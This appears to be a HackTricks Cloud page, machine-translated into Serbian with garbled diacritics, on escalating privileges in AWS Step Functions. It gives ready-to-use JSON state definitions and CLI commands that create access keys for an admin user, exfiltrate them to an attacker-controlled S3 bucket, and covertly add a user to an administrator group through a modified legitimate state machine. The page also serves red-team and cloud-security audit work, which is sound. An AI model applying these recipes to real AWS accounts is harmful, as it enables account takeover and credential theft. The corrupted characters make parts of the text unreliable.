# AWS - Eskalacija privilegija u koracima funkcija

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Koraci funkcija

Za vi코e informacija o ovoj AWS usluzi, proverite:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Napada캜 sa dozvolama **`states:TestState`** & **`iam:PassRole`** mo쬰 testirati bilo koji korak i proslediti bilo koju IAM ulogu bez kreiranja ili a쬿riranja postoje캖e ma코ine za stanja, omogu캖avaju캖i neovla코캖en pristup drugim AWS uslugama sa dozvolama uloga. Potencijalno, kombinovano, ove dozvole mogu dovesti do obimnih neovla코캖enih akcija, od manipulisanja radnim tokovima za izmenu podataka do curenja podataka, manipulacije resursima i eskalacije privilegija.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
### Primeri

Slede캖i primeri pokazuju kako testirati stanje koje kreira pristupni klju캜 za korisnika **`admin`** koriste캖i ova ovla코캖enja i permisivnu ulogu AWS okru쬰nja. Ova permisivna uloga treba da ima visoko privilegovanu politiku povezanu sa njom (na primer **`arn:aws:iam::aws:policy/AdministratorAccess`**) koja omogu캖ava stanju da izvr코i akciju **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Komanda** izvr코ena za izvo캠enje priveska:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Potencijalni Uticaj**: Neovla코캖eno izvr코avanje i manipulacija radnih tokova i pristup osetljivim resursima, 코to potencijalno mo쬰 dovesti do zna캜ajnih bezbednosnih propusta.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Napada캜 sa dozvolama **`states:CreateStateMachine`** i **`iam:PassRole`** bio bi u mogu캖nosti da kreira ma코inu stanja i dodeli joj bilo koju IAM ulogu, omogu캖avaju캖i neovla코캖en pristup drugim AWS uslugama sa dozvolama uloga. Za razliku od prethodne tehnike eskalacije privilegija (**`states:TestState`** & **`iam:PassRole`**), ova ne izvr코ava sama po sebi, tako캠e 캖e vam biti potrebne dozvole za **`states:StartExecution`** ili **`states:StartSyncExecution`** (**`states:StartSyncExecution`** nije dostupan za standardne radne tokove, ve캖 samo za izra쬬jne ma코ine stanja) kako biste pokrenuli izvr코avanje preko ma코ine stanja.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Primeri u nastavku pokazuju kako kreirati ma코inu stanja koja kreira pristupni klju캜 za korisnika **`admin`** i eksfiltrira ovaj pristupni klju캜 ka S3 bucketu koji kontroli코e napada캜, iskori코캖avaju캖i ove dozvole i permisivnu ulogu AWS okru쬰nja. Ova permisivna uloga treba da ima visoko privilegovanu politiku povezanu sa njom (na primer **`arn:aws:iam::aws:policy/AdministratorAccess`**) koja omogu캖ava ma코ini stanja da izvr코i akcije **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Komanda** izvr코ena za **kreiranje ma코ine stanja**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Komanda** izvr코ena za **pokretanje izvr코enja** prethodno kreiranog stanja ma코ine:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

S3 bucketa koji je pod kontrolom napada캜a treba da ima dozvole da prihvati akciju s3:PutObject od rtvinog naloga.

{% endhint %}

- **Potencijalni uticaj**: Neovla코캖eno izvr코avanje i manipulacija radnih tokova i pristup osetljivim resursima, 코to potencijalno mo쬰 dovesti do zna캜ajnih sigurnosnih propusta.

### `states:UpdateStateMachine` & (nije uvek potrebno) `iam:PassRole`

Napada캜 sa dozvolom **`states:UpdateStateMachine`** bi mogao da izmeni definiciju stanja ma코ine, dodaju캖i dodatna prikrivena stanja koja bi mogla rezultirati eskalacijom privilegija. Na ovaj na캜in, kada legitimni korisnik pokrene izvr코avanje stanja ma코ine, ovo novo zlonamerno prikriveno stanje 캖e biti izvr코eno i eskalacija privilegija 캖e biti uspe코na.

Zavisno o tome koliko je dozvoljavaju캖a IAM uloga povezana sa stanjem ma코ine, napada캜 bi se suo캜io sa 2 situacije:

1. **Dozvoljavaju캖a IAM uloga**: Ako je IAM uloga povezana sa stanjem ma코ine ve캖 dozvoljavaju캖a (na primer, ima prilo쬰nu politiku **`arn:aws:iam::aws:policy/AdministratorAccess`**), tada dozvola **`iam:PassRole`** ne bi bila potrebna kako bi se eskalirale privilegije jer ne bi bilo potrebno a쬿rirati i IAM ulogu, ve캖 bi bilo dovoljno samo a쬿rirati definiciju stanja ma코ine.
2. **Ne dozvoljavaju캖a IAM uloga**: Za razliku od prethodnog slu캜aja, ovde bi napada캜 tako캠e zahtevao dozvolu **`iam:PassRole`** jer bi bilo potrebno povezati dozvoljavaju캖u IAM ulogu sa stanjem ma코ine, pored modifikacije definicije stanja ma코ine.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
### Primeri

Ovi primeri pokazuju kako a쬿rirati legitimnu ma코inu stanja koja samo poziva HelloWorld Lambda funkciju, kako bi se dodao dodatni korak koji dodaje korisnika **`unprivilegedUser`** u **`administrator`** IAM grupu. Na ovaj na캜in, kada legitimni korisnik pokrene izvr코avanje a쬿rirane ma코ine stanja, ovaj novi zlonamerni korak 캖e biti izvr코en i eskalacija privilegija 캖e biti uspe코na.

{% hint style="warning" %}

Ako ma코ina stanja nema dozvoljenu IAM ulogu povezanu, tako캠e 캖e biti potrebna dozvola **`iam:PassRole`** za a쬿riranje IAM uloge kako bi se povezala dozvoljena IAM uloga (na primer, ona sa politikom **`arn:aws:iam::aws:policy/AdministratorAccess`**).

{% endhint %}

{% tabs %}

{% tab title="Legitimna Ma코ina Stanja" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Zlonamerno a쬿rirana ma코ina stanja" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
- **Komanda** izvr코ena za **a쬿riranje** **legitimnog stanja ma코ine**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Potencijalni uticaj**: Neovla코캖eno izvr코avanje i manipulacija radnih tokova i pristup osetljivim resursima, 코to potencijalno mo쬰 dovesti do zna캜ajnih sigurnosnih propusta.

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
